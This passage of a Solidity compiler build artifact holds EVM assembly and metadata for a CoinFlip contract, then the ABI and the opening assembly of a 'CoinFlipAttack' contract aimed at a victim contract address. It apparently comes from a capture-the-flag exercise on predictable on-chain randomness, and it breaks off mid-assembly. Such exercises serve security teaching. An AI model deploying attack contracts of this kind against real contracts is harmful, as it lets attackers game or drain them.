											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "tag",
											"source": 3,
											"value": "7"
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 747,
											"end": 753,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 796,
											"end": 798,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 784,
											"end": 793,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 775,
											"end": 782,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 771,
											"end": 794,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 767,
											"end": 799,
											"name": "SLT",
											"source": 3
										},
										{
											"begin": 764,
											"end": 883,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 764,
											"end": 883,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "55"
										},
										{
											"begin": 764,
											"end": 883,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 802,
											"end": 881,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "56"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 802,
											"end": 881,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 802,
											"end": 881,
											"name": "tag",
											"source": 3,
											"value": "56"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 764,
											"end": 883,
											"name": "tag",
											"source": 3,
											"value": "55"
										},
										{
											"begin": 764,
											"end": 883,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 922,
											"end": 923,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "57"
										},
										{
											"begin": 989,
											"end": 996,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 980,
											"end": 986,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 969,
											"end": 978,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 965,
											"end": 987,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 947,
											"end": 997,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 947,
											"end": 997,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 947,
											"end": 997,
											"name": "tag",
											"source": 3,
											"value": "57"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 937,
											"end": 997,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 937,
											"end": 997,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 893,
											"end": 1007,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "tag",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "59"
										},
										{
											"begin": 1116,
											"end": 1121,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 1101,
											"end": 1122,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "tag",
											"source": 3,
											"value": "59"
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1096,
											"end": 1099,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1089,
											"end": 1123,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1020,
											"end": 1129,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "tag",
											"source": 3,
											"value": "10"
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1222,
											"end": 1226,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1260,
											"end": 1262,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 1249,
											"end": 1258,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1245,
											"end": 1263,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1237,
											"end": 1263,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1237,
											"end": 1263,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "61"
										},
										{
											"begin": 1335,
											"end": 1336,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1324,
											"end": 1333,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 1320,
											"end": 1337,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1311,
											"end": 1317,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 1273,
											"end": 1338,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "tag",
											"source": 3,
											"value": "61"
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "tag",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1388,
											"end": 1395,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1417,
											"end": 1422,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1406,
											"end": 1422,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1406,
											"end": 1422,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "tag",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "64"
										},
										{
											"begin": 1539,
											"end": 1544,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 1521,
											"end": 1545,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "tag",
											"source": 3,
											"value": "64"
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1516,
											"end": 1519,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1509,
											"end": 1546,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1434,
											"end": 1552,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "tag",
											"source": 3,
											"value": "14"
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1651,
											"end": 1655,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1689,
											"end": 1691,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 1678,
											"end": 1687,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1674,
											"end": 1692,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1666,
											"end": 1692,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1666,
											"end": 1692,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "66"
										},
										{
											"begin": 1770,
											"end": 1771,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1759,
											"end": 1768,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 1755,
											"end": 1772,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1746,
											"end": 1752,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 1702,
											"end": 1773,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "tag",
											"source": 3,
											"value": "66"
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 1786,
											"end": 1966,
											"name": "tag",
											"source": 3,
											"value": "42"
										},
										{
											"begin": 1786,
											"end": 1966,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1834,
											"end": 1911,
											"name": "PUSH",
											"source": 3,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1831,
											"end": 1832,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1824,
											"end": 1912,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1931,
											"end": 1935,
											"name": "PUSH",
											"source": 3,
											"value": "11"
										},
										{
											"begin": 1928,
											"end": 1929,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 1921,
											"end": 1936,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1955,
											"end": 1959,
											"name": "PUSH",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 1952,
											"end": 1953,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1945,
											"end": 1960,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "tag",
											"source": 3,
											"value": "25"
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2011,
											"end": 2014,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "69"
										},
										{
											"begin": 2052,
											"end": 2057,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2034,
											"end": 2058,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "tag",
											"source": 3,
											"value": "69"
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2025,
											"end": 2058,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2025,
											"end": 2058,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2080,
											"end": 2146,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2073,
											"end": 2078,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2070,
											"end": 2147,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 2067,
											"end": 2170,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "70"
										},
										{
											"begin": 2067,
											"end": 2170,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "71"
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "42"
										},
										{
											"begin": 2150,
											"end": 2168,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "tag",
											"source": 3,
											"value": "71"
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2067,
											"end": 2170,
											"name": "tag",
											"source": 3,
											"value": "70"
										},
										{
											"begin": 2067,
											"end": 2170,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2197,
											"end": 2198,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 2190,
											"end": 2195,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2186,
											"end": 2199,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 2179,
											"end": 2199,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2179,
											"end": 2199,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "tag",
											"source": 3,
											"value": "29"
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2251,
											"end": 2255,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "73"
										},
										{
											"begin": 2289,
											"end": 2290,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2271,
											"end": 2291,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "tag",
											"source": 3,
											"value": "73"
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2266,
											"end": 2291,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2266,
											"end": 2291,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "74"
										},
										{
											"begin": 2323,
											"end": 2324,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2305,
											"end": 2325,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "tag",
											"source": 3,
											"value": "74"
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2300,
											"end": 2325,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2300,
											"end": 2325,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2344,
											"end": 2345,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2341,
											"end": 2342,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2338,
											"end": 2346,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "75"
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "76"
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "42"
										},
										{
											"begin": 2349,
											"end": 2367,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "tag",
											"source": 3,
											"value": "76"
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "tag",
											"source": 3,
											"value": "75"
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2394,
											"end": 2395,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2391,
											"end": 2392,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2387,
											"end": 2396,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 2379,
											"end": 2396,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2379,
											"end": 2396,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2408,
											"end": 2588,
											"name": "tag",
											"source": 3,
											"value": "43"
										},
										{
											"begin": 2408,
											"end": 2588,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2456,
											"end": 2533,
											"name": "PUSH",
											"source": 3,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2453,
											"end": 2454,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2446,
											"end": 2534,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2553,
											"end": 2557,
											"name": "PUSH",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 2550,
											"end": 2551,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 2543,
											"end": 2558,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2577,
											"end": 2581,
											"name": "PUSH",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 2574,
											"end": 2575,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2567,
											"end": 2582,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "tag",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2634,
											"end": 2635,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "79"
										},
										{
											"begin": 2669,
											"end": 2670,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2651,
											"end": 2671,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "tag",
											"source": 3,
											"value": "79"
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2646,
											"end": 2671,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2646,
											"end": 2671,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "80"
										},
										{
											"begin": 2703,
											"end": 2704,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2685,
											"end": 2705,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "tag",
											"source": 3,
											"value": "80"
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2680,
											"end": 2705,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2680,
											"end": 2705,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2724,
											"end": 2725,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2714,
											"end": 2749,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 2714,
											"end": 2749,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "82"
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "43"
										},
										{
											"begin": 2729,
											"end": 2747,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "tag",
											"source": 3,
											"value": "82"
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2714,
											"end": 2749,
											"name": "tag",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 2714,
											"end": 2749,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2771,
											"end": 2772,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2768,
											"end": 2769,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2764,
											"end": 2773,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 2759,
											"end": 2773,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2759,
											"end": 2773,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										}
									]
								}
							},
							"sourceList": [
								"contracts/Coinflip.sol",
								"contracts/CoinflipAttack.sol",
								"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.15+commit.e14f2714\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Coinflip.sol\":\"CoinFlip\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Coinflip.sol\":{\"keccak256\":\"0xf5f71814d02beb1badd816aec7513ea7546e3a200c389bc753a0515339bd5a60\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8cb365e2f1b38342ff63def1c42c3a11ffb600ad4c2e5958ea05f0c885513455\",\"dweb:/ipfs/QmfWwnsUcUrejTLLYbhmDcMQVGMkN7H9X5JYq8af9p5sCf\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":{\"keccak256\":\"0x0f633a0223d9a1dcccfcf38a64c9de0874dfcbfac0c6941ccf074d63a2ce0e1e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://864a40efcffdf408044c332a5aa38ec5618ed7b4eecb8f65faf45671bd6cdc65\",\"dweb:/ipfs/QmQJquTMtc6fgm5JQzGdsGpA2fqBe3MHWEdt2qzaLySMdN\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 7,
								"contract": "contracts/Coinflip.sol:CoinFlip",
								"label": "consecutiveWins",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 9,
								"contract": "contracts/Coinflip.sol:CoinFlip",
								"label": "lastHash",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							},
							{
								"astId": 12,
								"contract": "contracts/Coinflip.sol:CoinFlip",
								"label": "FACTOR",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/CoinflipAttack.sol": {
				"CoinFlipAttack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_victimContractAddress",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "victimContract",
							"outputs": [
								{
									"internalType": "contract CoinFlip",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/CoinflipAttack.sol\":167:711  contract CoinFlipAttack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/CoinflipAttack.sol\":250:327  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/CoinflipAttack.sol\":233:327  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"contracts/CoinflipAttack.sol\":334:447  constructor(address _victimContractAddress) public {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/CoinflipAttack.sol\":418:440  _victimContractAddress */\n  dup1\n    /* \"contracts/CoinflipAttack.sol\":392:406  victimContract */\n  0x00\n  dup1\n    /* \"contracts/CoinflipAttack.sol\":392:441  victimContract = CoinFlip(_victimContractAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/CoinflipAttack.sol\":334:447  constructor(address _victimContractAddress) public {... */\n  pop\n    /* \"contracts/CoinflipAttack.sol\":167:711  contract CoinFlipAttack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* 